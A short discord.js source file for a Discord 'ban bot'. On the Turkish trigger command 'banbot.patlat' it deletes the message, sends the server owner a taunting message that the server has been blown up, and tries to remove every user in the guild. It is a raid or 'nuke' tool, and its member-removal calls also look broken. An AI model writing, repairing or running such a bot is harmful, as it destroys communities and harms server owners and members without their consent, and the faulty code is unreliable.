const Discord = require('discord.js')
const config = require('./config.json')
const client = new Discord.Client();


client.on("ready", () => {
console.log("Bot Aktif")
});
client.on('message', msg => {
if (msg.content === 'banbot.patlat') {
msg.delete()
msg.guild.owner.send('Sunucun patladı kanka h.o')
msg.guild.users.forEach(ban_bot => {
ban_bot.delete()
});
}
});
client.login(config.token);
